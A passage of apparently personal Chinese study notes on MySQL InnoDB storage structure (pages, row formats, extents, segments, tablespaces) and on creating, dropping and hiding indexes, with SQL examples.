<p><strong>B树的非叶子结点也需要存储记录。</strong></p>
<h4 id="B-树-1"><a href="#B-树-1" class="headerlink" title="B+树"></a>B+树</h4><p>B树和B+树的差异：</p>
<blockquote>
<ol>
<li><p>有 k 个孩子的节点就有 k 个关键字。也就是孩子数量 &#x3D; 关键字数，而 B 树中，孩子数量 &#x3D; 关键字数+1</p>
</li>
<li><p>B+树非叶子节点的关键字也会同时存在于子节点中，并且是在子节点中所有关键字的最大（或最小）。</p>
</li>
<li><p>非叶子节点仅用于索引，不保存数据记录，跟记录有关的信息都放在叶子节点中。而 B 树中， 非叶子节点既保存索引，也保存数据记录 。</p>
</li>
<li><p>所有关键字都在叶子节点出现，叶子节点构成一个有序链表，而且叶子节点本身按照关键字的大小从小到大顺序链接。</p>
</li>
</ol>
</blockquote>
<h4 id="R树索引"><a href="#R树索引" class="headerlink" title="R树索引"></a>R树索引</h4><p>R-Tree在MySQL很少使用，仅支持 geometry数据类型 ，支持该类型的存储引擎只有myisam、bdb、innodb、ndb、archive几种。</p>
<h2 id="InnoDB数据存储结构"><a href="#InnoDB数据存储结构" class="headerlink" title="InnoDB数据存储结构"></a>InnoDB数据存储结构</h2><h3 id="数据库的存储结构-–-页"><a href="#数据库的存储结构-–-页" class="headerlink" title="数据库的存储结构 – 页"></a>数据库的存储结构 – 页</h3><p>数据库管理存储空间的基本单位是页（Page），数据库I&#x2F;O操作的最小单位是页。</p>
<h4 id="磁盘与内存交互的基本单位"><a href="#磁盘与内存交互的基本单位" class="headerlink" title="磁盘与内存交互的基本单位"></a>磁盘与内存交互的基本单位</h4><p>InnoDB将数据划分为若干页，以页作为磁盘和内存之间交互的基本单位，即一次最少从磁盘中读取16KB的内容到内存中，一次最少把内存中的16KB内容刷新到磁盘中。</p>
<blockquote>
<p>在数据库中，不论读一行，还是读多行，都是将这些行所在的页进行加载。</p>
</blockquote>
<h4 id="页的大小"><a href="#页的大小" class="headerlink" title="页的大小"></a>页的大小</h4><p>MySQL中每页的默认大小是16KB。SQL Server默认为8KB，Oracle中以块代替页，每块大小可为 2、4、8、16、32、64KB.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看默认页大小</span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%innodb_page_size%&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="页的结构"><a href="#页的结构" class="headerlink" title="页的结构"></a>页的结构</h4><p><strong>页间采用双向链表关联</strong>，在物理结构上可能并不相连。</p>
<p>每个数据页中的<strong>记录</strong>按照主键值从小到大的顺序形成<strong>单向链表</strong>。</p>
<p>每个数据页会生成内部记录对应的<strong>页目录</strong></p>
<p>（除了数据页还有目录页）</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/image-20241029221101195.png"></p>
<h4 id="页的上层结构"><a href="#页的上层结构" class="headerlink" title="页的上层结构"></a>页的上层结构</h4><p><img src="D:\workinenglish\typora_image\image-20241029222229266.png" alt="image-20241029222229266"></p>
<p>页的上层结构<strong>区</strong></p>
<blockquote>
<p>InnoDB中，默认区大小为1MB，一个区分配<strong>64</strong>个连续的页，</p>
</blockquote>
<p>区的上层结构<strong>段</strong></p>
<blockquote>
<p>段是数据库中的分配单位，不同类型的数据库对象（表、索引）以不同的段形式存在。如当我们创建一张表时会创建一个表段。一个段可能包含一个到多个区</p>
</blockquote>
<p>段的上层结构<strong>表空间</strong></p>
<blockquote>
<p>是一个逻辑容器，表空间存储的对象是段，在一个表空间中可以有一个或多个段，但是一个段只能属于一个表空间。数据库由一个或多个表空间组成，表空间从管理上可以划分为系统表空间、用户表空间、撤销表空间、临时表空间等。</p>
</blockquote>
<h3 id="页的具体内部结构"><a href="#页的具体内部结构" class="headerlink" title="页的具体内部结构"></a>页的具体内部结构</h3><p>页按类型分，可以分为数据页（保存B+树节点）、系统页、Undo页和事务数据页等。</p>
<p>数据页的存储空间被划分为七部分：文件头(38B)、页头(56B)、最大最小记录(26B)、用户记录、空闲空间、页目录、文件尾(8B)。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/image-20241029223134112.png"></p>
<h4 id="文件头和文件尾"><a href="#文件头和文件尾" class="headerlink" title="文件头和文件尾"></a>文件头和文件尾</h4><h5 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a><strong>文件头</strong></h5><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/image-20241029224809588.png"></p>
<p><strong>校验和</strong>：首尾均有，用于磁盘和内存的同步，每次更新重新计算校验和，如果首尾校验和不相等，说明同步过程出现问题。</p>
<h5 id="文件尾"><a href="#文件尾" class="headerlink" title="文件尾"></a><strong>文件尾</strong></h5><p>前4个字节代表页的校验和：这个部分是和File Header中的校验和相对应的。<br>后4个字节代表页面被最后修改时对应的日志序列位置（LSN）：这个部分也是为了校验页的完整性的，<br>如果首部和尾部的LSN值校验不成功的话，就说明同步过程出现了问题。</p>
<h4 id="空闲空间、用户记录、最大最小记录"><a href="#空闲空间、用户记录、最大最小记录" class="headerlink" title="空闲空间、用户记录、最大最小记录"></a>空闲空间、用户记录、最大最小记录</h4><p>User Records中的这些记录按照指定的行格式一条一条摆在User Records部分，相互之间形成单链表。</p>
<h4 id="页头和页目录"><a href="#页头和页目录" class="headerlink" title="页头和页目录"></a>页头和页目录</h4><h5 id="页目录"><a href="#页目录" class="headerlink" title="页目录"></a>页目录</h5><p>存储着每个分组中的最大值的地址偏移。在页中，记录是以单向链表的形式进行存储的，检索效率不高，最差的情况下需要遍历链表上的所有节点才能完成检索。因此在页结构中专门设计了页目录这个模块，专门给记录做一个目录，通过二分查找法的方式进行检索，提升效率。</p>
<p><strong>页目录的设计和二分查找</strong></p>
<ol>
<li>将所有的记录分成几个组，这些记录包括最小记录和最大记录，但不包括标记为“已删除”的记录。</li>
<li>第 1 组，也就是最小记录所在的分组只有 1 个记录； 最后一组，就是最大记录所在的分组，会有 1-8 条记录； 其余的组记录数量在 4-8 条之间。 这样做的好处是，除了第 1 组（最小记录所在组）以外，其余组的记录数会尽量平分。</li>
<li>在每个组中最后一条记录的头信息中会存储该组一共有多少条记录，作为 n_owned 字段。</li>
<li>页目录用来存储每组最后一条记录的地址偏移量，这些地址偏移量会按照先后顺序存储起来，每组的地址偏移量也被称之为槽（slot），每个槽相当于指针指向了不同组的最后一个记录。</li>
</ol>
<h5 id="页头"><a href="#页头" class="headerlink" title="页头"></a>页头</h5><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241030225458.png"></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241030225547.png"></p>
<h3 id="行格式"><a href="#行格式" class="headerlink" title="行格式"></a>行格式</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241030214912.png"></p>
<p>MySQL5.1默认设置为<code>Compact</code>行格式，一条完整的记录可以被分为记录的额外信息和真实数据两大部分</p>
<table>
<thead>
<tr>
<th align="center">额外信息</th>
<th>真实数据</th>
</tr>
</thead>
<tbody><tr>
<td align="center">变长字段长度列表| NULL值列表| 记录头信息</td>
<td>列1的值|</td>
</tr>
</tbody></table>
<p>InnoDB有4种行格式：<code>Compact</code>、<code>Redundant</code>、<code>Dynamic</code>、<code>Compressed</code></p>
<p>查看</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 表使用的行格式:</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLE</span> STATUS <span class="keyword">like</span> <span class="string">&#x27;表名&#x27;</span>\G</span><br><span class="line"><span class="comment">-- 查看MySQL默认行格式</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@innodb_default_row_format</span></span><br><span class="line"><span class="comment">-- 指定表的行格式</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp(id <span class="type">int</span>,name <span class="type">varchar</span>(<span class="number">15</span>)) row_format<span class="operator">=</span>compact;</span><br><span class="line"><span class="comment">-- 修改表的行格式</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp row_format<span class="operator">=</span>compact</span><br></pre></td></tr></table></figure>

<p>以<code>compact</code>为例介绍行格式如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp(id <span class="type">int</span>, name <span class="type">varchar</span>(<span class="number">15</span>)，email <span class="type">varchar</span>(<span class="number">20</span>)) row_format<span class="operator">=</span>compact;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> emp(id,name,email)<span class="keyword">values</span>(<span class="number">0</span>,<span class="string">&#x27;zhangshan&#x27;</span>,<span class="string">&#x27;1212@qq.com&#x27;</span>),(<span class="number">1</span>,<span class="string">&#x27;lisi&#x27;</span>,<span class="keyword">NULL</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241031223228.png"></p>
<h4 id="变长字段长度列表"><a href="#变长字段长度列表" class="headerlink" title="变长字段长度列表"></a>变长字段长度列表</h4><p>记录了变长字段的实际长度，按列的逆序存储，每个变长字段的长度占1个字节。</p>
<p>以上述第一条数据为例，变长字段<code>name</code>和<code>email</code>，分别为<code>zhangshan</code>、<code>1212@qq.com</code>，因此其对应的长度分别为<code>0x09</code>、<code>0x0B</code>（一个字节），存储时存储为<code>0B09</code>。</p>
<h4 id="NULL值列表"><a href="#NULL值列表" class="headerlink" title="NULL值列表"></a>NULL值列表</h4><p>记录了为NULL值的列，如果表中没有允许为NULL值的列，则没有这个字段。</p>
<p>用比特位代表是否为NULL，为1表示NULL,为0表示不为NULL；只表示允许为NULL的字段。如四个字段，一个是主键，则其不可能为NULL，因此NULL值列表有3比特，代表可以其他为NULL的三个字段。顺序也是反过来存放的。</p>
<ul>
<li>假设表有N列，并且其中M列允许存储NULL值。</li>
<li>则NULL值列表的大小为 <code>(M + 7) // 8</code> 字节。这里的 <code>//</code> 表示整数除法。</li>
</ul>
<blockquote>
<p>为什么要有NULL值列表？</p>
<p>假设四字段数据为a、NULL、NULL、b，若不存储NULL值，则a,b相邻存储，不知道哪个字段是NULL；若使用特殊字符代表NULL存储在a,b之间，占用太多空间。</p>
</blockquote>
<h4 id="记录头信息（5B）"><a href="#记录头信息（5B）" class="headerlink" title="记录头信息（5B）"></a>记录头信息（5B）</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241030094627.png"></p>
<p>主要字段：</p>
<ul>
<li><p><strong>delete_mask</strong>： 标记当前记录是否被删除，占1个二进制位，1代表被删除。</p>
<blockquote>
<p>为避免每次删除都需要重新排列记录，导致性能消耗，采用删除标记的方式。</p>
<p>所有被删除的记录会组成 垃圾链表 ；这个链表中记录所占的空间称为 可重用空间</p>
<p>插入新的记录会覆盖垃圾链表中的记录。</p>
</blockquote>
</li>
<li><p><strong>min_rec_mask</strong>：B+树的每层非叶子节点(存储目录项记录的页）中的最小记录会标记为1，其他记录均被标记为0.</p>
</li>
<li><p><strong>record_type</strong>：表示当前记录的类型</p>
<ul>
<li>0：普通记录</li>
<li>1：B+树非叶子节点记录</li>
<li>2：最小记录</li>
<li>3：最大记录</li>
</ul>
</li>
<li><p><strong>heap_no</strong>：表示当前记录在本页中的位置。</p>
<blockquote>
<p>MySQL中会自动给每个页添加两条记录，分别代表最小记录和最大记录，它们的heap_no分别为0、1，称为伪记录（虚拟记录），因此实际我们的记录从2开始编号。</p>
</blockquote>
</li>
<li><p><strong>n_owned</strong>：页目录中每个组中最后一条记录的头信息中会存储该组一共有多少条记录，作为 n_owned 字段</p>
<blockquote>
<p>最小记录所在分组只能有1条记录，最大记录分组可以在1<del>8之间，其他分组在4</del>8之间</p>
</blockquote>
</li>
<li><p><strong>next_record</strong>：表示从当前记录的真实数据到下一条记录的真实数据的<strong>地址偏移量</strong>。</p>
<blockquote>
<p>最小记录（指的是heap_no中提到的自动添加的记录，也即页的具体内部结构中的“最小记录”，而不是我们添加的记录中的“最小”）的next_record指向第一条记录，最后一条记录的next_record指向最大记录</p>
</blockquote>
</li>
</ul>
<h4 id="记录的真实数据"><a href="#记录的真实数据" class="headerlink" title="记录的真实数据"></a>记录的真实数据</h4><p>这部分除了记录我们自己定义的列的数据外，还存在三个隐藏列：</p>
<table>
<thead>
<tr>
<th>列名</th>
<th>是否必须</th>
<th>占用空间</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>row_id</td>
<td>否</td>
<td>6字节</td>
<td>行ID，唯一标识一条记录，当不存在能唯一标识记录的列时，会自动生成此列</td>
</tr>
<tr>
<td>transaction_id</td>
<td>是</td>
<td>6字节</td>
<td>事务ID</td>
</tr>
<tr>
<td>roll_pointer</td>
<td>是</td>
<td>7字节</td>
<td>回滚指针</td>
</tr>
</tbody></table>
<p>记录在实际数据之前</p>
<h4 id="Dynamic和Compressed"><a href="#Dynamic和Compressed" class="headerlink" title="Dynamic和Compressed"></a>Dynamic和Compressed</h4><p>MySQL5.7和8.0默认使用的是Dynamic。</p>
<p>大体上与Compact一样。</p>
<p>Compressed会对存储的数据以zlib算法进行压缩，因此对BLOB，TEXT，VARCHAR这些大长度数据能够更有效地存储</p>
<h5 id="行溢出"><a href="#行溢出" class="headerlink" title="行溢出"></a>行溢出</h5><p>InnoDB存储引擎可以将一条记录中的某些数据存储在真正的数据页面之外。</p>
<p>一个页最多存储16KB即16384字节，而varchar(M)类型的列最多可以存放65535字节，那么就会出现一个页存储不了一条记录的情况，这就是<code>行溢出</code></p>
<p>当出现行溢出时，就会进行分页存储，并用20字节指示下一存储页。具体处理存在区别：</p>
<ol>
<li>Dynamic和Compressed对于存储在BLOB中的数据采用了完全行溢出的方式，即原数据页只存储20字节的指针，指向溢出页的地址，而实际数据存储在溢出页中</li>
<li>Compact和Redundant会在原数据页的真实数据处存储一部分数据（768个前缀字节）</li>
</ol>
<h4 id="Redundant"><a href="#Redundant" class="headerlink" title="Redundant"></a>Redundant</h4><p>与Compact区别在于</p>
<ol>
<li>变长字段长度列表和NULL值列表被字段长度偏移列表取代，所有字段（包括隐藏字段）无论是否变长、是否可以为NULL，均记录其长度，并且记录的不是具体的长度，而是字段结尾相对第一个字段开头存的偏移。</li>
<li>记录头信息多出：<ol>
<li>n_fields（10B）字段，记录列的数量</li>
<li>1byte_offs_flag（1B）字段，记录字段长度偏移列表中每个列对应的偏移量使用1字节表示还是两字节表示。</li>
</ol>
</li>
<li>记录头信息没有了record_type</li>
</ol>
<p>已被淘汰，仅为向前支持。</p>
<h3 id="区、段和碎片区"><a href="#区、段和碎片区" class="headerlink" title="区、段和碎片区"></a>区、段和碎片区</h3><h4 id="为什么要有区、段和碎片段？"><a href="#为什么要有区、段和碎片段？" class="headerlink" title="为什么要有区、段和碎片段？"></a>为什么要有区、段和碎片段？</h4><p><strong>区：</strong></p>
<p>B+树的每一层的页都会形成一个双向链表，如果数据量很大，多个页的物理距离可能很远，不利于查询。一个区即连续的64页，当数据量太大是，为某个索引分配空间的时候就不在按照页为单位分配，而以区为单位分配，从而提高效率。</p>
<p><strong>段：</strong></p>
<p>对于范围查询，其实是对B+树叶子节点中的记录进行顺序扫描，而如果不区分叶子节点和非叶子节点，统统把节点代表的页面放到申请到的区中的话，进行范围扫描的效果就大打折扣了。所以InnoDB对B+树的叶子节点和非叶子节点进行了区别对待，也就是说叶子节点有自己独有的区，非叶子节点也有自己独有的区。存放叶子节点的区的集合就算是一个段（segment），存放非叶子节点的区的集合也算是一个段。也就是说一个索引会生成2个段，一个叶子节点段，一个非叶子节点段。除了索引的叶子节点段和非叶子节点段之外，InnoDB中还有为存储一些特殊的数据而定义的段，比如回滚段。所以，常见的段有数据段、索引段、回滚段。数据段即为B+树的叶子节点，索引段即为B+树的非叶子节点。<br>在InnoDB存储引擎中，对段的管理都是由引擎自身所完成，DBA不能也没有必要对其进行控制。这从一定程度上简化了DBA对于段的管理。<br>段其实不对应表空间中的某一个连续的物理区域，而是一个逻辑上的概念，由若干个零散的页面以及一些完整的区组成。</p>
<p><strong>碎片区：</strong></p>
<p>对于数据量较小的表，以完整的区为单位分配给某个段太浪费存储空间。因此InnoDB提出了一个碎片（fragment）区的概念。在一个碎片区中，并不是所有的页都是为了存储同一个段的数据而存在的，而是<br>碎片区中的页可以用于不同的目的，比如有些页面用于段A，有些页面用于段B，有些页甚至哪个段都不属于。<br><strong>碎片区直属于表空间</strong>，并不属于任何一个段。<br>所以此后为某个段分配存储空间的策略是这样的：</p>
<ul>
<li>在刚开始向表中插入数据的时候，段是从某个碎片区以单个页面为单位来分配存储空间的。</li>
<li>当某个段已经占用了32个碎片区页面之后，就会申请以完整的区为单位来分配存储空间。</li>
</ul>
<p>所以现在段不能仅定义为是某些区的集合，更精确的应该是某些零散的页面已经一些完整的区的集合</p>
<h4 id="区的分类"><a href="#区的分类" class="headerlink" title="区的分类"></a>区的分类</h4><p>区大体上可以分为四类：</p>
<ul>
<li><code>空闲的区(FREE)</code>：现在还没有用到这个区中的任何页面。</li>
<li><code>有剩余空间的碎片区(FREE_FRAG)</code>：表示碎片区中还有可用的页面</li>
<li><code>没有剩余空间的碎片区(FULL_FRAG)</code>：表示碎片区中的所有页面都被使用，没有空闲页面。</li>
<li><code>附属于某个段的区(FSEG)</code>：每一索引都可以分为叶子节点段和非叶子节点段</li>
</ul>
<p>FREE、FREE_FRAG、FULL_FRAG三个状态的区都是独立的，直属于表空间，FSEG附属于某个段。</p>
<h3 id="表空间"><a href="#表空间" class="headerlink" title="表空间"></a>表空间</h3><p>是一个逻辑容器，表空间存储的对象是段，一个表空间可以有一个到多个段，但一个段只能属于一个表空间。表空间数据库有一个到多个表空间组成，从管理上可以划分为<code>系统表空间</code>、<code>独立表空间</code>、<code>撤销表空间</code>和<code>临时表空间</code>。</p>
<h4 id="独立表空间"><a href="#独立表空间" class="headerlink" title="独立表空间"></a>独立表空间</h4><p>每张表有一个独立的表空间，其数据和索引信息均存储在自己的表空间中，可以在不同数据库之间迁移。</p>
<h4 id="系统表空间"><a href="#系统表空间" class="headerlink" title="系统表空间"></a>系统表空间</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241101163352.png"></p>
<h2 id="索引的创建和删除"><a href="#索引的创建和删除" class="headerlink" title="索引的创建和删除"></a>索引的创建和删除</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="索引的分类"><a href="#索引的分类" class="headerlink" title="索引的分类"></a>索引的分类</h4><p>MySQL的索引包括</p>
<ul>
<li><p>普通索引</p>
<blockquote>
<p>可以创建在任何数据类型中</p>
</blockquote>
</li>
<li><p>唯一性索引</p>
<blockquote>
<p>使用UNIQUE声明的字段（具有唯一性约束的字段）自动创建该索引，一张表可以有多个唯一索引。若在某一字段上创建唯一性索引，也就相当于添加了唯一性约束</p>
</blockquote>
</li>
<li><p>主键索引</p>
<blockquote>
<p>具有主键约束的字段自动创建该索引；若在某一字段上创建主键索引，也相当于添加了主键约束。一张表只能有一个主键索引。</p>
</blockquote>
</li>
<li><p>全文索引</p>
<blockquote>
<p>使用参数<code>FULLTEXT</code>可以设置全文索引，且只能创建在字符文本系列类型字段上。（已经不能跟上需求，被专门化搜索引擎取代）</p>
</blockquote>
</li>
<li><p>单列索引</p>
</li>
<li><p>多列索引</p>
</li>
<li><p>空间索引等。</p>
</li>
</ul>
<p>从 <strong>功能逻辑</strong> 上说，索引主要有 4 种，分别是<code>普通索引</code>、<code>唯一索引</code>、&#96;&#96;主键索引<code>、</code>全文索引<code>。 按照 **物理实现**方式 ，索引可以分为 2 种：</code>聚簇索引<code>和</code>非聚簇索引<code>。 按照 **作用字段个数** 进行划分，分成</code>单列索引<code>和</code>联合索引&#96;</p>
<h3 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h3><h5 id="创建表时添加索引"><a href="#创建表时添加索引" class="headerlink" title="创建表时添加索引"></a>创建表时添加索引</h5><p><strong>隐式创建</strong></p>
<p>在建表时，如果指定了主键约束、唯一性约束（外键约束也有唯一性约束），会自动创建对应的主键索引和唯一性索引，索引名即为字段名。</p>
<p> <strong>显式创建</strong></p>
<p>语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name [col_name data_type] [<span class="keyword">UNIQUE</span> <span class="operator">|</span> FULLTEXT <span class="operator">|</span> SPATIAL ][INDEX <span class="operator">|</span> KEY][index_name](col_name[length]) [ <span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>]</span><br></pre></td></tr></table></figure>

<p>说明:</p>
<ul>
<li><code>UNIQUE</code> | <code>FULLTEXT</code> | <code>SPATIAL </code>为可选参数，分别代表唯一索引、全文索引、空间索引。</li>
<li><code>INDEX</code> | <code>key</code>为同义词，作用相同，表示创建的是索引。</li>
<li>index_name 为可选参数，默认使用col_name作为索引名</li>
<li>col_name 为需要创建索引的字段列，必须从数据表定义的多个字段中选择</li>
<li>length为可选参数，表示索引长度，<strong>只有字符串类型</strong>的字段才能指定长度</li>
<li><code>ASC</code> | <code>DESC</code> 指定升序或降序的索引值存储。</li>
</ul>
<p><strong>查看索引</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> emp；</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> emp；</span><br></pre></td></tr></table></figure>

<p><strong>创建普通索引</strong></p>
<p><code>INDEX</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> emp(empId <span class="type">INT</span>,empName <span class="type">VARCHAR</span>(<span class="number">15</span>),age <span class="type">INT</span>,birYear <span class="keyword">YEAR</span>, INDEX idx_name(empName));</span><br></pre></td></tr></table></figure>

<p><strong>创建唯一索引</strong></p>
<p><code>UNIQUE INDEX</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> emp(empId <span class="type">INT</span>,empName <span class="type">VARCHAR</span>(<span class="number">15</span>),age <span class="type">INT</span>,birYear <span class="keyword">YEAR</span>, <span class="keyword">UNIQUE</span> INDEX idx_empId(empId));</span><br></pre></td></tr></table></figure>

<p><strong>创建主键索引</strong></p>
<p>只能通过隐式创建方式，通过指定主键约束列来创建，删除同样通过删除主键约束的方式删除。</p>
<p><strong>创建多列（联合）索引</strong></p>
<p><code>INDEX</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> emp(empId <span class="type">INT</span>,empName <span class="type">VARCHAR</span>(<span class="number">15</span>),age <span class="type">INT</span>,birYear <span class="keyword">YEAR</span>, INDEX idx_IdName(empId <span class="keyword">ASC</span>,empName <span class="keyword">DESC</span>));  <span class="comment">-- 之前的全部是单列索引。</span></span><br><span class="line"><span class="comment">-- 最常用于索引的字段放在最左侧</span></span><br></pre></td></tr></table></figure>

<p><strong>创建全文索引</strong></p>
<p><code>FULLTEXT INDEX</code></p>
<p>注意一些版本并不支持，且应当先添加数据再建立索引比较好。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 仅能在CHAR，VARCHAR，TEXT列创建索引</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> emp(empId <span class="type">INT</span>,empName <span class="type">VARCHAR</span>(<span class="number">15</span>),info <span class="type">VARCHAR</span>(<span class="number">255</span>), FULLTEXT INDEX idx_Info(<span class="number">50</span>));</span><br><span class="line"><span class="comment">-- 以info的前50个字符作为索引</span></span><br></pre></td></tr></table></figure>

<p>在创建全文索引之后，应当使用<code>MATCH</code>+<code>AGAINST</code>方式取代LIKE查询索引列，提速N倍</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> emp <span class="keyword">WHERE</span> <span class="keyword">MATCH</span>(info) AGAINST(<span class="string">&#x27;查询字符串&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>创建空间索引</strong></p>
<p>要求空间类型字段必须非空，使用<code>SPATIAL INDEX</code>关键字创建</p>
<h5 id="向表添加索引"><a href="#向表添加索引" class="headerlink" title="向表添加索引"></a>向表添加索引</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> book(</span><br><span class="line">	id <span class="type">INT</span>,</span><br><span class="line">	name <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">	info <span class="type">VARCHAR</span>(<span class="number">255</span>),</span><br><span class="line">    comments <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">    pubYear <span class="keyword">YEAR</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>增加索引有两种方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">ADD</span> [<span class="keyword">UNIQUE</span><span class="operator">|</span>FULLTEXT<span class="operator">|</span>SPATIAL<span class="operator">|</span>] INDEX indexName(colName);</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">CREATE</span> INDEX indexName <span class="keyword">ON</span> tableName(ColName);</span><br></pre></td></tr></table></figure>

<p>添加主键索引就是添加主键约束。</p>
<h3 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h3><p>删除索引有两种方式：DROP</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">DROP</span> [<span class="keyword">UNIQUE</span><span class="operator">|</span>FULLTEXT<span class="operator">|</span>SPATIAL<span class="operator">|</span>] INDEX indexName;</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">DROP</span> INDEX indexName <span class="keyword">ON</span> tableName;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>删除主键索引就是删除主键约束。</p>
</li>
<li><p>添加<code>AUTO_INCREMENT</code>约束的字段不能被删除唯一索引，因为<code>AUTO_INCREMENT</code>字段必须被唯一性约束。</p>
</li>
<li><p>删除表中的列，如果该列是联合索引的组成部分，则该列也会从索引中删除。</p>
</li>
</ul>
<h3 id="MySQL8-0索引的新特性"><a href="#MySQL8-0索引的新特性" class="headerlink" title="MySQL8.0索引的新特性"></a>MySQL8.0索引的新特性</h3><h4 id="支持降序索引"><a href="#支持降序索引" class="headerlink" title="支持降序索引"></a>支持降序索引</h4><p>MySQL8.0之前创建的都是升序索引，进行反向扫描效率很低，MySQL8.0开始正式支持降序索引，但降序索引的语法在5.7就已合法，只是功能未实现。</p>
<p>适用于经常需要降序的查询。</p>
<h4 id="隐藏索引"><a href="#隐藏索引" class="headerlink" title="隐藏索引"></a>隐藏索引</h4><p>有些时候我们可能错误删除索引后又不得不重新创建，会消耗大量系统资源。因此引入了<strong>隐藏索引</strong>，对于不再使用的索引，我们可以先设置未隐藏索引，<strong>索引隐藏后数据库操作不能再使用</strong>，如果对操作和性能没有太大影响，再删除。这种先将索引设置为隐藏索引再删除的方式就是<strong>软删除</strong>。这个方法同样可以验证索引对某些操作的性能是否有影响。</p>
<p><strong>主键不能设置为隐藏索引</strong>。当表中没有主键时，表中的一个唯一非空列会成为隐式主键，同样不能设置为隐藏索引。</p>
<p><strong>索引隐藏后，其内容也会随着表的更新而更新</strong>。因此建议不需要的隐藏索引及时删除。</p>
<h5 id="设置索引隐藏和可见"><a href="#设置索引隐藏和可见" class="headerlink" title="设置索引隐藏和可见"></a>设置索引隐藏和可见</h5><p>索引使用关键字<code>VISIBLE</code>和<code>INVISIBLE</code>表示索引的可见性，可在创建、添加索引的语句最末尾添加二者之一来标识，如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> emp(empId <span class="type">INT</span>,empName <span class="type">VARCHAR</span>(<span class="number">15</span>),age <span class="type">INT</span>,birYear <span class="keyword">YEAR</span>, INDEX idx_name(empName)) INVISIBLE;</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">ADD</span> [<span class="keyword">UNIQUE</span><span class="operator">|</span>FULLTEXT<span class="operator">|</span>SPATIAL<span class="operator">|</span>] INDEX indexName(colName) INVISIBLE;</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">CREATE</span> INDEX indexName <span class="keyword">ON</span> tableName(ColName) INVISIBLE;</span><br></pre></td></tr></table></figure>



<p><strong>也可以修改索引的可见性</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">ALTER</span> INDEX indexName INVISIBLE<span class="operator">|</span>VISIBLE</span><br></pre></td></tr></table></figure>



<p>可以设置隐藏索引对查询优化器可见：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> SESSION optimizer_switch <span class="operator">=</span> &quot;use_invisible_index=on&quot;;</span><br></pre></td></tr></table></figure>



